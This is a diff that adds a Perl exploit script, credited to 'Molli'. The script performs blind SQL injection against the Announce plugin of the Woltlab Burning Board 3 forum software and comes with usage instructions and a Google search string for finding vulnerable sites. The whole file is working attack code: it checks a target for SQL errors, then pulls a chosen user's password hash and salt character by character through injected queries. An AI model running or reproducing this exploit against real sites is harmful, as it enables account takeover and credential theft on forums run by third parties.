@@ -1,0 +1,112 @@
+#!/usr/bin/perl -w
+
+use strict;
+use LWP::Simple;
+
+$| = 1;
+
+print q{
+-----------------------------------------------
+Wbb3 Blind Sql Injection
+Injection in Announce Plugin (Kleinanzeigen Markt)
+Coded By Molli
+use: ano.pl [url] [user id] [Announce Catid]
+Google: "inurl:index.php?page=Announceshow"
+
+Special greetz to:
+B0nzai
+&
+Strike
+-----------------------------------------------
+};
+if (@ARGV < 3) {
+ print "Usage: ano.pl [url] [user id] [Announce CatID] \nExample: ano.pl www.target.com 1 1\n";
+ exit;
+}
+
+my $url = shift;
+my $uid  = shift;
+my $annid  = shift;
+my $prefix;
+
+my @charset = ('a','b','c','d','e','f','1','2','3','4','5','6','7','8','9','0');
+
+print "Check if Vulnerable....\n";
+my $chreq = get("http://".$url."/index.php?page=AnnounceShow&catID=1'");
+#print $chreq;
+if (($chreq =~ m/Fatal error/i) || ($chreq =~ m/Invalid SQL/i)) 
+	{
+		print "Vulnerable!\n";
+	} 
+		else 
+		{
+			print "Patched!\n";
+			exit;
+		}
+
+print "Checking Prefix\n";
+if ($chreq =~ m/_wcf/i) 
+	{
+		print "Found Prefix '$1'\n";
+		$prefix = $1;
+	} 
+		else 
+		{
+			print "Can't find prefix, using 'wcf1_'\n";
+			$prefix = "wcf1_";
+		}
+print "Exploiting...\n";
+print "Hash: ";
+
+my $counter = 1;
+my $countersalt = 1;
+while($counter < 41) 
+		{
+			foreach(@charset) 
+				{
+					my $ascode       = ord($_);
+					my $result       = get("http://".$url."/index.php?page=AnnounceShow&catID=".$annid."/**/AND/**/ascii(substring((SELECT/**/password/**/FROM/**/".$prefix."user/**/WHERE/**/userid=".$uid."),".$counter."))=".$ascode."");
+					if (length($result) != 0) 
+						{
+							if ($result =~ "keine") 
+								{
+								}
+									else
+										{
+											print chr($ascode);
+											$counter++;
+										}
+						}
+				}
+		}
+
+		
+my $saltcheck = get("http://".$url."/index.php?page=AnnounceShow&catID=".$annid."/**/AND/**/ascii(substring((SELECT/**/salt/**/FROM/**/".$prefix."user/**/WHERE/**/userid=".$uid."),1))>0");
+if($saltcheck =~ "keine")
+		{
+		}
+			else
+			{
+				print "\nSalt: ";
+				while($countersalt < 41) 
+					{
+						foreach(@charset) 
+							{
+								my $ascodesalt       = ord($_);
+								my $resultsalt       = get("http://".$url."/index.php?page=AnnounceShow&catID=".$annid."/**/AND/**/ascii(substring((SELECT/**/salt/**/FROM/**/".$prefix."user/**/WHERE/**/userid=".$uid."),".$countersalt."))=".$ascodesalt."");
+								if (length($resultsalt) != 0) 
+									{
+										if ($resultsalt =~ "keine") 
+											{
+											}
+												else
+													{
+														print chr($ascodesalt);
+														$countersalt++;
+													}
+									}
+							}
+					}
+			}
+print "\nDone! Exploit by molli\n";
+
